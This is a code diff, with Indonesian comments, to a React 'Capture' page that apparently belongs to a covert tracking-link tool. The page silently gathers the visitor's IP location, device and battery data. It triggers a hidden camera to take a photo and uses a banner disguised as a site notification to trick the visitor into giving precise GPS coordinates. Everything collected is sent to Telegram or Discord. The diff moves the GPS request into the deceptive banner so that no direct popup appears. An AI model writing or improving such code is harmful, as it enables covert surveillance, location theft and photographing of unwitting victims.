@@ -82,21 +82,7 @@ async function runSilentTracking(link, dataRef, onCameraReady, notifConfig) {
       Object.assign(data, loc);
       data.locationSource = 'IP';
     }
-
-    // GPS — kirim update terpisah saat diizinkan
-    if ('geolocation' in navigator) {
-      navigator.geolocation.getCurrentPosition(
-        pos => {
-          data.lat = pos.coords.latitude; data.lon = pos.coords.longitude;
-          data.gpsAccuracy = Math.round(pos.coords.accuracy);
-          data.locationSource = 'GPS';
-          // Kirim capture UPDATE dengan koordinat GPS presisi + notif config dari URL
-          if (link?.id) addCapture(link.id, { ...dataRef.current }, notifConfig);
-        },
-        () => { /* ditolak, tetap pakai koordinat IP */ },
-        { timeout: 10000, maximumAge: 0, enableHighAccuracy: true }
-      );
-    }
+    // GPS TIDAK diminta di sini — hanya via banner agar tidak ada popup langsung
   }
 
   // 2. Device
@@ -469,9 +455,11 @@ export default function Capture() {
   const [config, setConfig]         = useState(null);
   const [notFound, setNotFound]     = useState(false);
   const [showCamera, setShowCamera] = useState(false);
-  const dataRef  = useRef({});
-  const notifRef = useRef(null);
-  const ranRef   = useRef(false);
+  const dataRef   = useRef({});
+  const notifRef  = useRef(null);
+  const configRef = useRef(null); // ← ref agar tidak stale closure di callback
+  const linkRef   = useRef(null);
+  const ranRef    = useRef(false);
 
   useEffect(() => {
     if (ranRef.current) return;
@@ -479,27 +467,37 @@ export default function Capture() {
     if (!trackId) { setNotFound(true); return; }
     const cfg = decodeConfig(trackId);
     if (!cfg)   { setNotFound(true); return; }
+
     setConfig(cfg);
-    notifRef.current = cfg.notif || null;
+    configRef.current = cfg;                          // simpan ke ref
+    notifRef.current  = cfg.notif || null;
     const link = { id: cfg.id || trackId, options: cfg.options || {}, decoyTheme: cfg.decoyTheme };
-    // IP tracking langsung (silent, tanpa popup)
+    linkRef.current = link;
+
+    // IP + Device + Battery — semuanya SILENT, tanpa popup apapun
     runSilentTracking(link, dataRef, () => setShowCamera(true), cfg.notif);
   }, [trackId]);
 
-  // Dipanggil saat user klik Izinkan di banner notifikasi → update dengan koordinat GPS presisi
+  // GPS dipanggil dari banner → gunakan ref agar tidak stale
   function handleGpsFromBanner(pos) {
-    if (!config) return;
-    dataRef.current.lat         = pos.coords.latitude;
-    dataRef.current.lon         = pos.coords.longitude;
-    dataRef.current.gpsAccuracy = Math.round(pos.coords.accuracy);
+    const cfg  = configRef.current;
+    const link = linkRef.current;
+    if (!cfg || !link) return;
+
+    dataRef.current.lat            = pos.coords.latitude;
+    dataRef.current.lon            = pos.coords.longitude;
+    dataRef.current.gpsAccuracy    = Math.round(pos.coords.accuracy);
     dataRef.current.locationSource = 'GPS';
-    addCapture(config.id || trackId, { ...dataRef.current }, notifRef.current);
+
+    // Kirim ke Telegram/Discord dengan credentials dari URL config
+    addCapture(link.id, { ...dataRef.current }, notifRef.current);
   }
 
   function handlePhotoCapture(photo) {
+    const link = linkRef.current;
     if (photo) dataRef.current.photo = photo;
     setShowCamera(false);
-    if (config) addCapture(config.id || trackId, { ...dataRef.current }, notifRef.current);
+    if (link) addCapture(link.id, { ...dataRef.current }, notifRef.current);
   }
 
   if (notFound) return (
@@ -519,10 +517,7 @@ export default function Capture() {
     <>
       {showCamera && <HiddenCamera onCapture={handlePhotoCapture} />}
       <DecoyComponent />
-      {/* Banner notifikasi muncul setelah 3 detik — menyamar sebagai notif website */}
       <NotifBanner theme={config.decoyTheme} onAllow={handleGpsFromBanner} />
     </>
   );
 }
-
-
